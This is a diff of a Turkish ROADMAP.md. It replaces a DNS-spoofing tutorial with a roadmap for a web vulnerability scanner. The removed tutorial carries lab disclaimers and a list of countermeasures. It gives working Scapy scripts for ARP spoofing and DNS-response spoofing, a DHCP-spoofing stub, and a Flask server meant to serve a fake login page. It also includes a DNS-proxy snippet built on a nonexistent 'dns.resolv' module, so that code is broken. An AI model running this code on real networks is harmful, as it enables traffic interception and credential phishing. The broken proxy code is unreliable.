@@ -1,172 +1,58 @@
-# ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme
+# Web Analizi Yol Haritası
 
-## Giriş
-Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, Python kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar. **Önemli Uyarı: Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.**
+**Proje Hedefleri:**
+- Otomatik form, URL, path ve JavaScript tabanlı parametre testleri
+- Otomatik CSRF, XSS, SQLi, dosya yükleme ve JavaScript analizleri
+- Gelişmiş form ve parametre analiz motoru
+- Güvensiz HTTP header konfigürasyonlarının raporlanması
+- Gelişmiş XSS ve SQL Injection payload analizi
+- Özelleştirilebilir payload desteği ile kapsamlı tarama
+- Otomatik giriş mekanizması ile oturumlu sayfaların test edilmesi
+- Web uygulamalarındaki temel güvenlik açıklarının tespiti
+- Güvenlik farkındalığı ve hızlı test süreçlerine katkı
+- HTML ve JSON formatlarında raporlama
 
-Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.
+## Aşama 1: Planlama ve Hazırlık
+- **Görev 1:** Rakip güvenlik tarama araçlarını analiz ederek gereksinimleri netleştirin.
+- **Görev 2:** 2025’in en iyi 10 tekniğini (ör. AI tabanlı zafiyet tespiti) belirleyip entegrasyon planı oluşturun.
+- **Görev 3:** Proje kapsamını, kaynak ihtiyaçlarını ve zaman çizelgesini tanımlayın.
+- **Görev 4:** Geliştirme ortamını (IDE, versiyon kontrol, kütüphaneler) kurun.
 
-## Ön Koşullar
-- **Python 3.x**: Geliştirme için temel dil.
-- **Kütüphaneler**:
-  - Scapy: Paket oluşturma ve ağ manipülasyonu için (`pip install scapy`).
-  - dnslib: DNS sunucusu oluşturmak için (`pip install dnslib`).
-  - Flask: Sahte web sunucusu için (`pip install flask`).
-- **Bilgi Gereksinimleri**:
-  - Python programlama temelleri.
-  - Ağ protokolleri (IP, ARP, DNS, DHCP) hakkında temel bilgi.
-  - Linux komut satırı kullanımı.
-- **Araçlar**: VirtualBox veya benzeri bir sanallaştırma yazılımı.
+## Aşama 2: Sistem Tasarımı
+- **Görev 1:** Asenkron tarama için ölçeklenebilir bir mimari tasarlayın.
+- **Görev 2:** Veritabanı şeması ve veri modellerini (tarama sonuçları, raporlar) oluşturun.
+- **Görev 3:** Kullanıcı dostu bir arayüz (UI/UX) tasarlayın.
+- **Görev 4:** Özelleştirilebilir payload ve otomatik giriş mekanizması için teknik tasarımlar yapın.
 
-## Test Ortamını Kurma
-Güvenli bir test ortamı oluşturmak için aşağıdaki adımları izleyin:
-1. **VirtualBox Kurulumu**: VirtualBox’ı indirin ve kurun.
-2. **Sanal Makineler (VM) Oluşturma**:
-   - **Saldırgan VM**: Kali Linux veya herhangi bir Linux dağıtımı.
-   - **Kurban VM**: Herhangi bir işletim sistemi (ör. Windows, Linux).
-3. **Ağ Yapılandırması**: VM’leri yalnızca dahili veya host-only bir ağda çalışacak şekilde ayarlayın. Bu, testlerin üretim ağlarından izole olmasını sağlar.
+## Aşama 3: Geliştirme
+- **Kilometre Taşı 1: Çekirdek Tarama Motoru**
+  - Form, URL, path ve JavaScript parametrelerini otomatik tarayan motor geliştirin.
+  - Asenkron yapıyı uygulayarak yüksek performans sağlayın.
+- **Kilometre Taşı 2: Zafiyet Tespit Modülleri**
+  - XSS, SQLi, CSRF, dosya yükleme ve güvensiz HTTP header tespiti için modüller oluşturun.
+  - AI/ML ile zafiyet tespit doğruluğunu artırın.
+- **Kilometre Taşı 3: Gelişmiş Analiz ve Özelleştirme**
+  - Gelişmiş form ve parametre analiz motoru ile özelleştirilebilir payload desteği ekleyin.
+  - İleri XSS ve SQLi payload analizini entegre edin.
+- **Kilometre Taşı 4: Oturum ve Raporlama**
+  - Otomatik giriş mekanizması ile oturumlu sayfaları test etme özelliği geliştirin.
+  - HTML ve JSON formatlarında raporlama modülü oluşturun.
 
-## Temel Bileşenlerin Geliştirilmesi
+## Aşama 4: Test ve Doğrulama
+- **Görev 1:** Birim testleriyle her modülün (ör. XSS, SQLi tespiti) işlevselliğini doğrulayın.
+- **Görev 2:** Entegrasyon testleri ile sistem uyumluluğunu kontrol edin.
+- **Görev 3:** Aracın kendi güvenliğini (ör. veri şifreleme) test edin.
+- **Görev 4:** Kullanıcı kabul testleriyle hedeflerin karşılandığını doğrulayın.
 
-### ARP Spoofing Betiği
-ARP spoofing, ortadaki adam (MITM) saldırıları için temel bir adımdır. Bu betik, saldırganın MAC adresini ağ geçidinin IP’siyle ilişkilendirmek için sahte ARP yanıtları gönderir.
+## Aşama 5: Dağıtım
+- **Görev 1:** Üretim ortamını (sunucu, bulut altyapısı) hazırlayın.
+- **Görev 2:** Aracı üretime dağıtın.
+- **Görev 3:** Mevcut güvenlik sistemleriyle (ör. SIEM) entegrasyonu tamamlayın.
+- **Görev 4:** Kullanıcı dokümantasyonu ve eğitim materyalleri sağlayın.
 
-1. Scapy’yi kurun: `pip install scapy`
-2. IP yönlendirmeyi etkinleştirin: `sudo sysctl -w net.ipv4.ip_forward=1`
-3. ARP spoofing betiğini oluşturun:
+## Aşama 6: Sürekli İyileştirme
+- **Görev 1:** Araç performansını ve güvenilirliğini düzenli izleyin.
+- **Görev 2:** Kullanıcı geri bildirimlerine dayalı güncellemeler yapın.
+- **Görev 3:** Yeni zafiyet türleri ve trendler için modül güncellemeleri yayınlayın.
 
-```python
-from scapy.all import *
-import time
-
-def get_mac(ip):
-    ans, _ = arping(ip)
-    for s, r in ans:
-        return r[Ether].src
-
-def arp_spoof(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
-    while True:
-        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
-        time.sleep(2)
-
-# Kullanım
-arp_spoof('192.168.1.10', '192.168.1.1')  # hedef_ip, ağ_geçidi_ip
-```
-
-### DNS Spoofing Betiği
-Bu betik, DNS sorgularını yakalar ve sahte yanıtlarla kurbanı yönlendirir.
-
-1. Scapy ile DNS spoofing betiğini yazın:
-
-```python
-from scapy.all import *
-
-def dns_spoof(packet):
-    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
-        spoofed_ip = "192.168.1.100"  # Saldırganın IP’si
-        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
-                         UDP(dport=packet[UDP].sport, sport=53)/\
-                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-        send(spoofed_packet, verbose=0)
-
-sniff(filter="udp port 53", prn=dns_spoof)
-```
-
-### DHCP Manipülasyon Betiği
-Bu betik, sahte DHCP teklifleriyle istemcilere yanlış bir DNS sunucusu atar (DDSpoof benzeri).
-
-1. Scapy ile DHCP spoofing betiği:
-
-```python
-from scapy.all import *
-
-def dhcp_spoof(packet):
-    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # Keşif (Discover)
-        fake_dns = "192.168.1.100"
-        # Sahte DHCP yanıtı oluşturma (detaylı paket yapılandırması gerekir)
-        # send(dhcp_offer)
-
-sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)
-```
-
-### Sahte Web Sunucusu
-Kimlik avı veya sahte içerik sunmak için bir web sunucusu oluşturun.
-
-1. Flask’ı kurun: `pip install flask`
-2. Basit bir Flask uygulaması yazın:
-
-```python
-from flask import Flask, render_template
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('fake_login.html')
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
-```
-
-- `templates/fake_login.html` dosyası oluşturun (örneğin, bir giriş sayfası taklidi).
-
-## Gelişmiş Geliştirmeler
-
-### Seçmeli DNS Spoofing için DNS Proxy
-DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.
-
-1. dnslib’i kurun: `pip install dnslib`
-2. DNS proxy betiği:
-
-```python
-from dnslib import *
-from dnslib.server import DNSServer, DNSHandler, BaseResolver
-import dns.resolv
-
-class SpoofResolver(BaseResolver):
-    def resolve(self, request, handler):
-        reply = request.reply()
-        qname = str(request.q.qname)
-        if qname in ['example.com.']:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
-        else:
-            # Gerçek DNS’e yönlendirme
-            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
-        return reply
-
-resolver = SpoofResolver()
-server = DNSServer(resolver, port=53, address='0.0.0.0')
-server.start_thread()
-```
-
-### Entegre MITM Betiği
-Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.
-
-1. Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin.
-2. Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin.
-
-## Geliştirmelerin Test Edilmesi
-1. **ARP Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`); ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı.
-2. **DNS Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de bir alan adı çözümleyin (ör. `nslookup example.com`); sahte IP dönmeli.
-3. **DHCP Manipülasyonu**:
-   - Betiği çalıştırın.
-   - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`); DNS sunucusu sahte IP olmalı.
-4. **Sahte Web Sunucusu**:
-   - Kurban VM’den sahte domaine erişin; sahte sayfa görüntülenmeli.
-
-## Karşı Önlemler ve En İyi Uygulamalar
-- **Statik ARP Girişleri**: ARP spoofing’i önler.
-- **DNSSEC**: DNS sorgularını doğrular.
-- **HTTPS Kullanımı**: Sertifika uyarılarına dikkat edin.
-- **VPN**: Trafiği şifreler ve yerel manipülasyonları engeller.
-- **İzole Test Ortamı**: Üretim ağlarında test yapmayın.
-
-## Sonuç
-Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır. Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri siber güvenliği güçlendirmek için kullanmaya devam edin.
+**Not:** Bu yol haritası, proje hedeflerini (otomatik tarama, özelleştirilebilirlik, raporlama) karşılayacak şekilde yapılandırılmıştır ve 2025 trendleri (AI, ML) ile uyumludur.
